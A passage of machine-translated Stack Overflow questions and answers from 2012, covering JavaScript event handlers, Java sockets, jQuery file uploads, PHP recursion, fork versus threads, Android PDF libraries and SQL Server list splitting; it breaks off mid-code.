> 时间：2012-06-28T11:08:54.233

您可以添加一个标识符或只在 onclick 事件中调用一个函数。例如：

```
<script type="text/javascript">
    function onButtonClick(button)
    { 
        alert("button " + button + " clicked!"); 
    }
</script>

<button id="ButtonA" onclick="javascript:onButtonClick('buttonA'); return false;" />
<button id="ButtonB" onclick="javascript:onButtonClick('buttonB'); return false;" /> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-28T11:18:27.823

这是一个很好的例子。将您的代码作为回调传输`runOnce`并创建一个如下所示的 onclick 事件处理程序，以将您的函数限制为一次调用：

```
function runOnce( callback ) {

  var done = false;

  return function() {

    if ( !done ) {
      done = true;

      callback();

    }

  };

}

var one = runOnce(function() {
    alert('Once');
}),
    two = runOnce(function() {
    alert('Once only too.');
});

document.getElementById('first').onclick = one;
document.getElementById('second').onclick = two; 
```

这是一个[演示](http://jsfiddle.net/5nvCX/)

# vb6 - VB6 API 声明中的“未定义用户定义类型”编译错误

> ID：11243152
> 
> 赞同：0
> 
> 时间：2012-06-28T10:58:40.430
> 
> 标签：vb6

为什么在尝试编译以下 API 声明时出现“未定义用户定义的类型”错误？

```
Public Declare Function RegQueryInfoKey Lib "advapi32.dll" Alias _
  "RegQueryInfoKeyA" (ByVal hKey As Long, ByVal lpClass As String, _
  ByRef lpcbClass As Long, ByRef lpReserved As Long, ByRef lpcSubKeys As Long, _
  ByRef lpcbMaxSubKeyLen As Long, ByRef lpcbMaxClassLen As Long, _
  ByRef lpcValues As Long, ByRef lpcbMaxValueNameLen As Long, _
  ByRef lpcbMaxValueLen As Long, ByRef lpcbSecurityDescriptor As Long, _
  ByRef lpftLastWriteTime As FILETIME) As Long 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:10:51.153

看起来您还没有声明`FILETIME`UDT。

在 VB6 中，它被声明为：

```
Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type 
```

# java - Java TCP服务器从客户端收到所有发送的每一行

> ID：11243155
> 
> 赞同：1
> 
> 时间：2012-06-28T10:58:59.277
> 
> 标签：java, sockets, tcp, flush

我编写了两个小型 Java 程序：一个 TCP 客户端，它从一个 txt 文件发送多行数据，一个 TCP 服务器，它接受连接并逐行接收。

它可以工作，但是当传输结束并且客户端关闭套接字时，服务器会一起接收所有行。我不明白为什么，因为我在每行发送到客户端后都使用刷新，我一直认为这是为了避免这种情况。

如果我的 test.txt 文件包含数字 1 2 3 ... 10，每一个都在一个新行中，服务器的输出是：“12345678910”，然后在一个新行中它在控制台中写入“null”。

服务器代码：

```
import java.io.*;
import java.net.*;

class ServidorTCP {

  private String HOST;
  static final int PUERTO = 20001;

      public ServidorTCP( ) {
        try{
          ServerSocket skServidor = new ServerSocket(PUERTO);
              Socket skCliente = skServidor.accept();
          DataInputStream inFromClient = new DataInputStream(new BufferedInputStream(skCliente.getInputStream()));

          while(true){
              String lineaLeida = inFromClient.readUTF();
              if(lineaLeida.equals("END")) break;
              System.out.println(lineaLeida);
          }
              inFromClient.close();
              skCliente.close();
          skServidor.close();
          System.out.println( "Transmission ended" );
        } catch( Exception e ) {
          System.out.println( e.getMessage() );
        }
      }

      public static void main( String[] arg ) {
        new ServidorTCP();
      }

    } 
```

客户代码：

```
import java.io.*;
import java.net.*;

class ClienteTCP {

  static final String HOST = "192.168.1.201";
  static final int PUERTO = 20001;

  public ClienteTCP( ) {
    try{
      Socket skCliente = new Socket(HOST, PUERTO);
      if(skCliente.isConnected()) System.out.println("Connected!");
      DataOutputStream outToServer = new DataOutputStream(skCliente.getOutputStream());

      File testFile = new File("test.txt");
      BufferedReader input = new BufferedReader(new FileReader(testFile));
      String line;
      while((line=input.readLine())!=null) {
        if(!line.endsWith("\n")) line = line + "\n";
        System.out.println("Sending: " + line);
        outToServer.writeBytes(line);
        outToServer.flush();
        Thread.currentThread().sleep(1000);
      }
      outToServer.writeBytes("END");
      input.close();
      outToServer.close();
      skCliente.close();
    } catch( Exception e ) {
      System.out.println( e.getMessage() );
    }
  }

  public static void main( String[] arg ) {
    new ClienteTCP();
  }

} 
```

问题出在哪里？

编辑：我已按照建议编辑了代码。现在什么都收不到

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:05:51.283

事实是您的代码根本不起作用，更不用说在套接字关闭之前或之后。您正在使用`writeUTF()`和阅读`readLine().`这不起作用。你需要：

1.  写`DataOutputStream.writeUTF()`和读`DataInputStream.readUTF()`

2.  用`println()`（由多个 I/O 类提供）或`write()`或`print()`（由多个 I/O 类提供）写入，后跟`BufferedWriter.newline()`, 或

3.  用 写`ObjectOutputStream.writeObject()`和读`ObjectInputStream.readObject()`。

等等。使用一个 API 编写和使用非对称 API 读取是行不通的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:44:00.583

问题不在于阅读或写作（或至少不是明确的）。问题是你的字符串。`input.readLine()`删除`end of line`这意味着您发送的字符串只是数字。在服务器端，您会收到很多字符串，但要`inFromClient.readLine()`等到它得到一个`end of line`永远不会到达的字符串，直到流关闭并发送一个`end of file`.

只需在`end of line`您发送的每个字符串中添加一个，它应该可以工作。

# javascript - 如何使用jquery上传文件？

> ID：11243161
> 
> 赞同：1
> 
> 时间：2012-06-28T10:59:15.597
> 
> 标签：javascript, asp.net, entity-framework, jquery

我想使用 jQuery 上传文件并存储在服务器上的文件夹中。我不知道如何开始。文件路径还需要存储在 Oracle 数据库中。我的整个场景都是基于实体框架的。有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:01:15.547

使用此插件进行 jquery 文件上传。

[http://www.uploadify.com/](http://www.uploadify.com/)

或者，使用这个——

[http://blueimp.github.com/jQuery-File-Upload/](http://blueimp.github.com/jQuery-File-Upload/)

或者，在 -- 找到一些更体面的插件

[http://www.tutorialchip.com/jquery/9-powerful-jquery-file-upload-plugins/](http://www.tutorialchip.com/jquery/9-powerful-jquery-file-upload-plugins/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-08T04:36:34.367

如果您不想使用任何插件，您可以在 jquery 中使用 iframe 轻松上传文件。很多天以来我都面临着这个问题，现在我已经解决了。

```
$(document).ready(function () {
    $("#formsubmit").click(function () {       

        var iframe = $('<iframe name="postframe" id="postframe" class="hidden" src="about:none" />');         

        $('div#iframe').append(iframe);        

        $('#theuploadform').attr("action", "/ajax/user.asmx/Upload")
        $('#theuploadform').attr("method", "post")
        $('#theuploadform').attr("userfile", $('#userfile').val())
        $('#theuploadform').attr("enctype", "multipart/form-data")
        $('#theuploadform').attr("encoding", "multipart/form-data")
        $('#theuploadform').attr("target", "postframe")         
        $('#theuploadform').submit();
        //need to get contents of the iframe
        $("#postframe").load(
            function () {
                iframeContents = $("iframe")[0].contentDocument.body.innerHTML;
                $("div#textarea").html(iframeContents);
            }
        );

<div id="uploadform">
    <form id="theuploadform" action="">
        <input id="userfile" name="userfile" size="50" type="file" />
        <input id="formsubmit" type="submit" value="Send File" />
    </form>
</div>

<div id="iframe" style="width: 0px; height: 0px; display: none;">
</div>

<div id="textarea">
</div> 
```

它将上传文件。现在唯一剩下的就是在您的服务器上接收该文件。我已经使用 servlet 来获取文件，然后我调用了一项服务。该示例适用于每个文件图像、文本、docx、doc 等。

小服务程序：

```
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
try {
    ServletFileUpload upload = new ServletFileUpload();
    response.setContentType("text/plain"); 
    //response.setContentType("application/msword");

    FileItemIterator iterator = upload.getItemIterator(request);

    while (iterator.hasNext()) {
        FileItemStream item = iterator.next();
        String filename = item.getName();
        InputStream stream = item.openStream();
        //more here you wanna to do with that file do.
    }
} 
catch (FileUploadException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} 
```

享受...

# javascript - 如何在 Javascript 中使用正则表达式捕获这种模式？

> ID：11243168
> 
> 赞同：0
> 
> 时间：2012-06-28T10:59:55.950
> 
> 标签：javascript, regex

如何使用`JavaScript`正则表达式捕获以下模式？

我想捕获以单词边界结尾的第一个字符序列。序列长度应*最小*且大于`N`。

例如。

```
N = 6，输入 =“aa bb cc ddd ee”
result = "aa bb cc" // 第一个以单词边界结尾的最小序列 > 6

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:15:18.567

如果我很好理解，请尝试类似

```
var n   = 6, 
    str = "aa bb cc ddd ee",
    re  = new RegExp("^.{"+ (n+1) +"}.*?\\b");

str.match(re);  // "aa bb cc" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:22:02.100

这个正则表达式应该工作

```
"^.{" + (n+1) + ",}?\b" 
```

# php - 如何在 PHP 中以树格式返回多维数组键？

> ID：11243170
> 
> 赞同：2
> 
> 时间：2012-06-28T10:59:59.917
> 
> 标签：php, arrays, tree, key, multidimensional-array

如何在 PHP 中以树格式返回多维数组键？

例如，如果我有以下数组：

```
$array = array ( 
    array (
        'name' => 'A', 
        'product' => array (
            'qty' => 1,
            'brand' => 'Tim'
        ), 
        'goods' => array (
            'qty' => 2
        ), 
        'brand' => 'Lin'
    ),
    array (
        'name' => 'B', 
        'product' => array (
            'qty' => 6,
            'brand' => 'Coff'
        ),
        'goods' => array (
            'qty' => 4
        ), 
        'brand' => 'Ji'
    )
); 
```

我怎样才能得到如下结果——包括不重复键：

```
-name
-product
--qty
--brand
-goods
--qty
--brand 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:12:06.070

递归函数应涵盖您想要/需要的任何深度：

```
 function print_tree($tree, $level = 0) {
     foreach($tree AS $name => $node) {
         if(
               is_scalar($node) OR
               (
                   is_object($node) AND
                   method_exists($node, '__toString')
               )
           ) {
             echo str_repeat('-', $level).$name.': '.$node;
         }
         else if(
                   is_array($node) OR
                   (
                       is_object($node) AND
                       $node InstanceOf Traversable
                   )
                ) {
             echo str_repeat('-', $level).$name.":\n";
             print_tree($node, $level+1);
         }
     }
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:11:41.907

具有无限深度，您需要一个递归函数。我想你有 $names 中的父母和 $children 中的孩子：

```
function render_select($root=0, $level=-1) 
{
    global $names, $children;
    if ($root != 0)
       echo '<option>' . strrep(' ', $level) . $names[$root] . '</option>';
    foreach ($children[$root] as $child)
       render_select($child, $level+1);
} 
```

这个函数很有用，因为你可以用 2 个变量来喂它。另一个答案需要一个多维数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:12:23.083

```
function print_tree($array, $level=1) {
    foreach($array as $element) {
        if(is_array($element)) {
            print_tree($element, $level+1);
        } else {
            print str_repeat('-', $level).$element."\n";
        }
    }
} 
```

# c - 线程创建和子进程创建中的系统调用有什么区别

> ID：11243173
> 
> 赞同：0
> 
> 时间：2012-06-28T11:00:13.970
> 
> 标签：c, multithreading, unix, process

线程的实现是如何在系统中完成的？我知道子进程是使用 fork() 调用创建的，并且线程是轻量级的。线程的创建与子进程的创建有何不同？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:10:34.290

线程是使用系统调用创建的，该`clone()`系统调用可以创建一个与其父进程共享内存空间和一些内核控制结构的新进程。这些进程称为 LWP（轻量级进程），也称为内核级线程。

`fork()`创建一个新进程，该进程*最初*与其父进程共享内存，但页面是写时复制的，这意味着当原始页面的内容发生更改时会创建单独的内存页面。因此，父进程和子进程都不能再更改彼此的内存，并且它们有效地作为单独的进程运行。此外，新分叉的子进程是一个成熟的进程，具有独立的内核控制结构。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:04:55.370

***每个进程都有自己的地址空间***，也就是进程可以访问的虚拟地址范围。当一个新进程被*分叉*时，必须制作所有相关资源的副本。分叉完成后，子节点和父节点拥有各自不同的地址空间以及其中涉及的所有资源。当然，这是一个性能密集型操作。

虽然***同一进程中的所有线程共享相同的地址空间***，但当*产生*一个新线程时，每个线程只需要自己的堆栈，并且不会像进程那样重复所有资源。因此产生一个线程的性能要低得多密集的。

当然，这两种操作不能也不应该进行比较，因为它们都针对不同的需求提供了本质上不同的特性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T14:05:25.853

好吧，您已经阅读了重要部分，现在这里是幕后的东西：

在当前的实现中（当前意味着过去几十年），进程内存在技术上不会在分叉后立即复制。只读部分只是在两个进程之间共享（因为它们无论如何都不能更改），当然还有共享库的只读部分。但最重要的是，所有可写的东西最初也只是共享的。然而，它是以写保护的方式共享的，一旦你写入子进程内存（例如通过增加一个变量），内核中就会产生一个页面错误，这只会导致内核*实际*复制相应的页面（然后发生修改）。

这种称为“写入时复制”的出色优化导致子进程通常不会真正消耗与其父进程一样多的（物理）内存。然而，对于程序开发者（和用户）来说，它是完全透明的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T11:05:58.680

那么它有很大的不同，首先，子进程在某种程度上是父程序的副本，并且所有变量都重复，并且您通过其 PID 将子进程与父进程区分开来。线程就像新程序，它们与主程序同时运行（看起来是同时运行的，由于 os 对 cpu 时间的切片）。线程可以在程序中使用全局变量，但它们不会像进程一样重复。因此使用线程比使用新进程要便宜得多。

# php - PHP将图像上传到服务器而不是裁剪不显示最大文件错误

> ID：11243174
> 
> 赞同：0
> 
> 时间：2012-06-28T11:00:14.560
> 
> 标签：php, jquery

此代码会将图像上传到服务器，然后用户可以裁剪图像。

[http://www.webmotionuk.co.uk/php-jquery-image-upload-and-crop/](http://www.webmotionuk.co.uk/php-jquery-image-upload-and-crop/)

在代码中，您可以上传的最大文件大小定义为 3 MB。当您上传超过 3 MB 的文件时，它必须向用户显示此错误“图像必须在”.$max_file.“MB in size" 但是这段代码总是显示错误！选择要上传的图像”

还有比这个更好的插件吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:17:52.857

这是上传图像的最新链接，不仅适用于 jpeg，因为您的链接仅适用于 jpg 图像。检查这个链接——http: [//www.webmotionuk.co.uk/php-jquery-image-upload-and-crop-v11/](http://www.webmotionuk.co.uk/php-jquery-image-upload-and-crop-v11/)

向下滚动并抓住这个捆绑包，如图所示——

![图片](../Images/f480faf10524e0cfb092bc593af0ec7d.png)

**PS——**

检查您的图像上传设置以及`php.ini`

# android - Android PDF 查看器库

> ID：11243178
> 
> 赞同：3
> 
> 时间：2012-06-28T11:00:21.080
> 
> 标签：android, pdf, viewer

我知道这个问题已经被问过很多次了，但我仍然不清楚是否有一个现有的且工作正常的库来本地显示 PDF 文档。

我只想查看存储在我的应用程序中的 PDF 文档。打开一个新 Activity 对我来说没问题，我不需要在现有视图中显示它。我已经构建了一段代码来启动读取本地 PDF 文件的活动意图，但是当然，如​​果设备上尚未安装 PDF 查看器应用程序，则不会发生任何事情。

我听说过 APV、VuDroid、droidreader 等，但似乎它们都是 APK，而不是可以在我的应用代码中使用的库。

那么，有没有真正的 Android 库来实现这一点？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-24T07:06:05.737

这个你可以试试它在离线模式下工作 [https://github.com/bitfield66/PdfViewerAndroid_Offline](https://github.com/bitfield66/PdfViewerAndroid_Offline)

它只接受pdf路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-25T11:29:14.400

我喜欢[MuPDF Adnroid 库](https://github.com/muennich/mupdf)，因为它是用 C++/NDK 编写的，并且它具有独特的功能，例如可点击的图像（我的意思是链接到图像的 URL） - 没有遇到具有此功能的其他库，我真的需要它。
[您实际上可以完全不使用 lib 打开 PDF：通过 google docs 使用 WebView](https://stackoverflow.com/questions/9455425/android-webview-pdf-viewing)但我不喜欢这种方式，因为在使用 MuPDF 时始终需要 IC，我可以 DL pdf 文件并随时离线打开它。此外，WebView 方式对于设备来说更“难”，这意味着电池耗尽 + 滞后 + CPU 加热，并且它使用更多的流量（如果与 DL&show 方式相比）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-04T12:09:30.483

首先，要在 android 中查看 pdf，您必须将 pdf 转换为图像，然后将它们显示给用户。（我将使用网络视图）

所以要做到这一点，我们需要这个[库](https://github.com/StEaLtHmAn/AndroidPDFViewerLibrary)。这是我编辑的这个[git](https://github.com/jblough/Android-Pdf-Viewer-Library)版本。

将库导入项目后，您需要创建活动。

XML：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <WebView
            android:id="@+id/webView1"
            android:layout_width="match_parent"
            android:layout_height="match_parent"/>

</LinearLayout> 
```

java onCreate：

```
//Imports:
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.ViewTreeObserver;
import android.webkit.WebView;
import com.sun.pdfview.PDFFile;
import com.sun.pdfview.PDFImage;
import com.sun.pdfview.PDFPage;
import com.sun.pdfview.PDFPaint;
import net.sf.andpdf.nio.ByteBuffer;
import net.sf.andpdf.refs.HardReference;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.RandomAccessFile;
import java.nio.channels.FileChannel;

//Globals:
private WebView wv;
private int ViewSize = 0;

//OnCreate Method:
@Override
protected void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    //Settings
    PDFImage.sShowImages = true; // show images
    PDFPaint.s_doAntiAlias = true; // make text smooth
    HardReference.sKeepCaches = true; // save images in cache

    //Setup webview
    wv = (WebView)findViewById(R.id.webView1);
    wv.getSettings().setBuiltInZoomControls(true);//show zoom buttons
    wv.getSettings().setSupportZoom(true);//allow zoom
    //get the width of the webview
    wv.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener()
    {
        @Override
        public void onGlobalLayout()
        {
            ViewSize = wv.getWidth();
            wv.getViewTreeObserver().removeGlobalOnLayoutListener(this);
        }
    });

    pdfLoadImages();//load images
} 
```

加载图像：

```
private void pdfLoadImages()
{
    try
    {
        // run async
        new AsyncTask<Void, Void, Void>()
                {
                    // create and show a progress dialog
                    ProgressDialog progressDialog = ProgressDialog.show(MainActivity.this, "", "Opening...");

                    @Override
                    protected void onPostExecute(Void result)
                    {
                        //after async close progress dialog
                        progressDialog.dismiss();
                    }

                    @Override
                    protected Void doInBackground(Void... params)
                    {
                        try
                        {
                            // select a document and get bytes
                            File file = new File(Environment.getExternalStorageDirectory().getPath()+"/randompdf.pdf");
                            RandomAccessFile raf = new RandomAccessFile(file, "r");
                            FileChannel channel = raf.getChannel();
                            ByteBuffer bb = ByteBuffer.NEW(channel.map(FileChannel.MapMode.READ_ONLY, 0, channel.size()));
                            raf.close();
                            // create a pdf doc
                            PDFFile pdf = new PDFFile(bb);
                            //Get the first page from the pdf doc
                            PDFPage PDFpage = pdf.getPage(1, true);
                            //create a scaling value according to the WebView Width
                            final float scale = ViewSize / PDFpage.getWidth() * 0.95f;
                            //convert the page into a bitmap with a scaling value
                            Bitmap page = PDFpage.getImage((int)(PDFpage.getWidth() * scale), (int)(PDFpage.getHeight() * scale), null, true, true);
                            //save the bitmap to a byte array
                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
                            page.compress(Bitmap.CompressFormat.PNG, 100, stream);
                            stream.close();
                            byte[] byteArray = stream.toByteArray();
                            //convert the byte array to a base64 string
                            String base64 = Base64.encodeToString(byteArray, Base64.DEFAULT);
                            //create the html + add the first image to the html
                            String html = "<!DOCTYPE html><html><body bgcolor=\"#7f7f7f\"><img src=\"data:image/png;base64,"+base64+"\" hspace=10 vspace=10><br>";
                            //loop through the rest of the pages and repeat the above
                            for(int i = 2; i <= pdf.getNumPages(); i++)
                            {
                                PDFpage = pdf.getPage(i, true);
                                page = PDFpage.getImage((int)(PDFpage.getWidth() * scale), (int)(PDFpage.getHeight() * scale), null, true, true);
                                stream = new ByteArrayOutputStream();
                                page.compress(Bitmap.CompressFormat.PNG, 100, stream);
                                stream.close();
                                byteArray = stream.toByteArray();
                                base64 = Base64.encodeToString(byteArray, Base64.DEFAULT);
                                html += "<img src=\"data:image/png;base64,"+base64+"\" hspace=10 vspace=10><br>";
                            }
                            html += "</body></html>";
                            //load the html in the webview
                            wv.loadDataWithBaseURL("", html, "text/html","UTF-8", "");
                    }
                    catch (Exception e)
                    {
                        Log.d("CounterA", e.toString());
                    }
                        return null;
                    }
                }.execute();
                System.gc();// run GC
    }
    catch (Exception e)
    {
        Log.d("error", e.toString());
    }
} 
```

# php - 我们在激活您的帐户时遇到问题

> ID：11243179
> 
> 赞同：-3
> 
> 时间：2012-06-28T11:00:28.787
> 
> 标签：php, mysql, database, phpmyadmin

当电子邮件激活此错误消息“我们在激活您的帐户时遇到问题”

我的激活码有什么问题..??? **下面给出代码..**

**'激活.php'**

```
<?php 
    include 'core/init.php';
    logged_in_redirect();
    include 'includes/overall/header.php';

    if (isset($_GET['success']) === true && empty($_GET['success']) === true) {
    ?>
        <h2>Thanks, we've activated your account....</h2>
        <p>You're free to Log in!</p>

    <?php

    } else if (isset($_GET['email'], $_GET['email_code']) === true) {

        $email      = trim($_GET['email']);
        $email_code   = trim($_GET['email_code']);

        if (email_exists($email) === false) {
            $errors[] = 'Oops, something went wrong and we could\'t find that email address';
        } else if (activate($email, $email_code) === false) {
            $errors[] = 'We had problems activating your account';
        }

        if (empty($errors) === false) {
        ?>
            <h2>Ooops...</h2>
        <?php
            echo output_errors($errors);        
        } else {
            header('Location: activate.php?success');
            exit();
        }

    } else {
        header('Location: index.php');
        exit();
    }

    include 'includes/overall/footer.php'; 
?> 
```

**下面给出的电子邮件链接代码：** * *'user.php'* *

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:03:33.143

`activate`函数`false`返回。确保以正确的方式调用它并且它按预期工作。

# iphone - IOS GLKit：动态淡化纹理（OpenGL）

> ID：11243182
> 
> 赞同：0
> 
> 时间：2012-06-28T11:00:34.737
> 
> 标签：iphone, ios, ipad, opengl-es, glkit

我正在尝试动态淡化项目，因为它们看起来更远。

我有这个效果很好，纹理显示很好但不会褪色。

```
 effect.texture2d0.enabled = GL_TRUE;
 effect.texture2d0.envMode = GLKTextureEnvModeReplace;
 effect.texture2d0.target = GLKTextureTarget2D;
 effect.texture2d0.name = texture.name;

 // transparancy
 glEnable(GL_BLEND);
 glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA); 
```

然后我将其更改为这个（基于一些堆栈溢出帖子）。启用 GLKTextureEnvModeModulate 或添加 glColor4f 会给我一个错误 GL ERROR: 0x0502

```
effect.texture2d0.enabled = GL_TRUE;
effect.texture2d0.envMode = GLKTextureEnvModeModulate;
effect.texture2d0.target = GLKTextureTarget2D;
effect.texture2d0.name = texture.name;

// transparancy
glEnable(GL_BLEND);
glBlendFunc(GL_ONE, GL_ONE_MINUS_SRC_ALPHA); // GL_SRC_ALPHA

glColor4f(0.7, 0.7, 0.7, 0.7); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T04:28:18.980

这是我所做的：

```
 self.effect.texture2d0.envMode = GLKTextureEnvModeModulate;
   self.effect.texture2d0.target = GLKTextureTarget2D;
   self.effect.texture2d0.name = mTexture.name;

   self.effect.texture2d1.envMode = GLKTextureEnvModeDecal;
   self.effect.texture2d1.target = GLKTextureTarget2D;
   self.effect.texture2d1.name = mTexture2.name; 
```

您将获得混合，但我仍然无法应用动态不透明度系数。

# java - JAXB 会为我处理文件锁定吗？

> ID：11243184
> 
> 赞同：2
> 
> 时间：2012-06-28T11:00:40.667
> 
> 标签：java, jaxb, filelock

我想确保在读取 xml 文件时没有其他进程修改它。这是我的代码：

```
final File file = new File(configFilePath);
final FileChannel channel = new RandomAccessFile(file, "rw").getChannel();
final FileLock lock = channel.tryLock();
if (lock == null) {
        throw new MyCustomException(ErrorCode.configurationFileAlreadyLocked);
}
try {
    final Unmarshaller u = JAXBContext.newInstance(Configuration.class).createUnmarshaller();
    u.setSchema(getSchema());
    return u.unmarshal(new StreamSource(file), Configuration.class).getValue();
} finally {
        lock.release();
} 
```

当我执行代码时，我得到一个带有 IOException 的 javax.xml.bind.UnmarshalException 作为原因：

```
Caused by: java.io.IOException: The process cannot access the file because another process has locked a portion of the file
at java.io.FileInputStream.readBytes(Native Method)
at java.io.FileInputStream.read(FileInputStream.java:220)
at java.io.BufferedInputStream.fill(BufferedInputStream.java:218)
at java.io.BufferedInputStream.read(BufferedInputStream.java:237)
at com.sun.org.apache.xerces.internal.impl.XMLEntityManager$RewindableInputStream.read(XMLEntityManager.java:2977)
at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:702)
at com.sun.org.apache.xerces.internal.impl.XMLVersionDetector.determineDocVersion(XMLVersionDetector.java:186)
at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:772)
at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:200)
... 33 more 
```

我会认为，因为获取锁的过程相同，所以不应该受到伤害。

如果我没有获得 FileLock，一切正常。

JAXB 是否已经为我处理文件锁定？

亲切的问候

塞巴斯蒂安

# sql - 将变量传递给 SQL 函数中的 IN 子句？

> ID：11243188
> 
> 赞同：1
> 
> 时间：2012-06-28T11:00:51.507
> 
> 标签：sql, sql-server, sql-server-2008, tsql

> **可能重复：**
> [参数化 SQL IN 子句？](https://stackoverflow.com/questions/337704/parameterizing-an-sql-in-clause)

我有一个 SQL 函数，我需要将一个 ID 列表作为字符串传递到：

身份在哪里（@MyList）

我环顾四周，大多数答案要么是在 C# 中构建 SQL 并且它们循环并调用 AddParameter，要么是动态构建 SQL。

我的 SQL 函数相当大，因此动态构建查询会相当乏味。

真的没有办法将一串逗号分隔的值传递到 IN 子句中吗？

我传入的变量表示整数列表，因此它将是：

“1,2,3,4,5,6,7”等

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T13:58:53.847

这是一种更有效的拆分整数列表的方法。首先，创建一个数字表，如果您还没有的话。这将创建一个包含 100,000 个唯一整数的表（您可能需要更多或更少）：

```
;WITH x AS
(
   SELECT TOP (1000000) Number = ROW_NUMBER() OVER 
   (ORDER BY s1.[object_id])
   FROM sys.all_objects AS s1 CROSS JOIN sys.all_objects AS s2
   ORDER BY s1.[object_id]
)
SELECT Number INTO dbo.Numbers FROM x;

CREATE UNIQUE CLUSTERED INDEX n ON dbo.Numbers(Number); 
```

然后是一个函数：

```
CREATE FUNCTION [dbo].[SplitInts_Numbers]
(
   @List       NVARCHAR(MAX),
   @Delimiter  NVARCHAR(255)
)
RETURNS TABLE
WITH SCHEMABINDING
AS
   RETURN
   (
       SELECT Item = CONVERT(INT, SUBSTRING(@List, Number,
         CHARINDEX(@Delimiter, @List + @Delimiter, Number) - Number))
       FROM dbo.Numbers
       WHERE Number <= CONVERT(INT, LEN(@List))
         AND SUBSTRING(@Delimiter + @List, Number, 1) = @Delimiter
   ); 
```

您可以在此处将性能与迭代方法进行比较：

[http://sqlfiddle.com/#!3/960d2/1](http://sqlfiddle.com/#!3/960d2/1)

为了避免使用数字表，您还可以尝试使用基于 XML 的函数版本 - 它更紧凑但效率较低：

```
CREATE FUNCTION [dbo].[SplitInts_XML]
(
   @List       VARCHAR(MAX),
   @Delimiter  CHAR(1)
)
RETURNS TABLE
WITH SCHEMABINDING
AS
   RETURN ( SELECT Item = CONVERT(INT, Item) FROM ( 
     SELECT Item = x.i.value('(./text())[1]', 'int') FROM ( 
       SELECT [XML] = CONVERT(XML, '<i>' + REPLACE(@List, @Delimiter, '</i><i>') 
       + '</i>').query('.') ) AS a CROSS APPLY [XML].nodes('i') AS x(i)) AS y
     WHERE Item IS NOT NULL
   ); 
```

无论如何，一旦你有了一个函数，你可以简单地说：

```
WHERE ID IN (SELECT Item FROM dbo.SplitInts_Numbers(@MyList, ',')); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:12:09.613

`IN`无法将字符串直接传递到子句中。但是，如果您将列表作为字符串提供给存储过程，例如，您可以使用以下**脏方法**。

首先，创建这个函数：

```
CREATE FUNCTION [dbo].[fnNTextToIntTable] (@Data NTEXT)
RETURNS 
    @IntTable TABLE ([Value] INT NULL)
AS
BEGIN
    DECLARE @Ptr int, @Length int, @v nchar, @vv nvarchar(10)

    SELECT @Length = (DATALENGTH(@Data) / 2) + 1, @Ptr = 1

    WHILE (@Ptr < @Length)
    BEGIN
        SET @v = SUBSTRING(@Data, @Ptr, 1)

        IF @v = ','
        BEGIN
            INSERT INTO @IntTable (Value) VALUES (CAST(@vv AS int))
            SET @vv = NULL
        END
        ELSE
        BEGIN
            SET @vv = ISNULL(@vv, '') + @v
        END

        SET @Ptr = @Ptr + 1
    END

    -- If the last number was not followed by a comma, add it to the result set
    IF @vv IS NOT NULL
        INSERT INTO @IntTable (Value) VALUES (CAST(@vv AS int))

    RETURN
END 
```

（注意：这不是我的原始代码，但由于我工作地点的版本控制系统，我丢失了链接到源代码的标题注释。）

然后像这样使用它：

```
SELECT  *
FROM    tblMyTable
        INNER JOIN fnNTextToIntTable(@MyList) AS List ON tblMyTable.ID = List.Value 
```

或者，如您的问题所示：

```
SELECT  *
